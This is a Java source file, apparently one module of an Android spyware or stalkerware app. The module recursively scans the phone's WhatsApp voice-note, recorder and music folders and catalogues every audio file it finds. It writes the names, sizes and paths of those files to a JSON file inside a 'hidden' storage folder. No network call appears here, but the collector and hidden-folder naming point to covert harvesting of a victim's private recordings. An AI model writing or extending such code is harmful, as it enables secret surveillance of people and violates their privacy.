package com.alzahra.collectors;

import android.content.Context;
import android.os.Environment;
import android.util.Log;

import com.alzahra.storage.HiddenStorageManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;

public class MediaCollector {
    
    private static final String TAG = "MediaCollector";

    public static void collect(Context context) {
        try {
            JSONObject data = new JSONObject();
            JSONArray recordings = new JSONArray();
            
            String[] paths = {
                "/WhatsApp/Media/WhatsApp Voice Notes",
                "/Recorder",
                "/Recordings",
                "/Download/Recorder",
                "/Music"
            };
            
            for (String path : paths) {
                File dir = new File(Environment.getExternalStorageDirectory(), path);
                if (dir.exists() && dir.isDirectory()) {
                    scanForAudio(dir, recordings);
                }
            }
            
            data.put("type", "audio_media");
            data.put("count", recordings.length());
            data.put("timestamp", System.currentTimeMillis());
            data.put("recordings", recordings);
            
            File outputFile = new File(HiddenStorageManager.getHiddenFolder(context), "media_data.json");
            FileOutputStream fos = new FileOutputStream(outputFile);
            fos.write(data.toString().getBytes());
            fos.close();
            
            Log.d(TAG, "Collected " + recordings.length() + " media files");
            
        } catch (Exception e) {
            Log.e(TAG, "Media collection failed", e);
        }
    }
    
    private static void scanForAudio(File dir, JSONArray list) {
        File[] files = dir.listFiles();
        if (files == null) return;
        
        for (File file : files) {
            if (file.isDirectory()) {
                scanForAudio(file, list);
            } else {
                String name = file.getName().toLowerCase();
                if (name.endsWith(".mp3") || name.endsWith(".m4a") || 
                    name.endsWith(".opus") || name.endsWith(".ogg") ||
                    name.endsWith(".wav") || name.endsWith(".amr")) {
                    try {
                        JSONObject rec = new JSONObject();
                        rec.put("name", file.getName());
                        rec.put("size", file.length());
                        rec.put("path", file.getAbsolutePath());
                        list.put(rec);
                    } catch (Exception e) {}
                }
            }
        }
    }
}
